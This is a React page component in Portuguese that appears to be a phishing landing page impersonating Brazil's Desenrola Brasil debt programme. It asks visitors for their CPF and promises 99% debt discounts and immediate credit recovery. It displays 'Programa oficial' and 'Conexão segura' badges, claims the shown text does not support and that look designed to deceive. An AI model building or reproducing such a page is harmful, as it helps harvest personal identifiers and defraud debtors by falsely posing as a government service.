import { Headphones, Info, Lock, Moon, ShieldCheck } from 'lucide-react'
import CpfForm from '@/components/cpf-form'

export default function RenegociarPage() {
  return (
    <div className="min-h-screen bg-[#eeeeee]">
      <header className="border-t-4 border-[#1e293b] bg-white">
        <div className="mx-auto flex max-w-5xl items-center justify-end gap-5 px-4 py-3 text-[#1e40af]">
          <button type="button" aria-label="Alternar tema" className="transition-opacity hover:opacity-70">
            <Moon className="size-5" aria-hidden="true" />
          </button>
          <button type="button" aria-label="Suporte" className="transition-opacity hover:opacity-70">
            <Headphones className="size-5" aria-hidden="true" />
          </button>
        </div>
      </header>

      <main className="flex justify-center px-4 py-10 sm:py-14">
        <article className="w-full max-w-[640px] rounded-lg bg-white px-4 py-6 shadow-sm sm:px-6 sm:py-8 md:px-10 md:py-10">
          <img
            src="/assets/limpe-nome-logo.png"
            alt="Limpe seu Nome e Desenrola, Brasil!"
            className="mx-auto h-auto w-44 object-contain sm:w-56 md:w-72"
          />

          <p className="mt-4 text-center text-sm leading-snug text-gray-800 sm:mt-6 sm:text-base md:text-lg">
            <span className="mr-1 inline-block align-middle text-[#22c55e]">✅</span>
            <strong>ATUALIZADO</strong> - Informe seu CPF e clique em &quot;Continuar&quot; para
            <br className="hidden sm:block" /> renegociar suas dívidas com descontos de 99%
          </p>

          <CpfForm />

          <div className="mt-6 flex items-start gap-3 rounded-lg bg-[#eef2ff] px-4 py-4 text-sm text-[#1e40af] sm:text-base">
            <Info className="mt-0.5 size-5 shrink-0" aria-hidden="true" />
            <p className="leading-snug">
              O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
            </p>
          </div>

          <div className="mt-6 flex flex-wrap items-center justify-center gap-x-8 gap-y-2 text-sm text-gray-600">
            <span className="flex items-center gap-1.5">
              <Lock className="size-4" aria-hidden="true" /> Conexão segura
            </span>
            <span className="flex items-center gap-1.5">
              <ShieldCheck className="size-4" aria-hidden="true" /> Programa oficial
            </span>
          </div>
          <p className="mt-3 text-center text-xs text-gray-400">
            Sistema de Renegociação — Todos os direitos reservados
          </p>
        </article>
      </main>
    </div>
  )
}
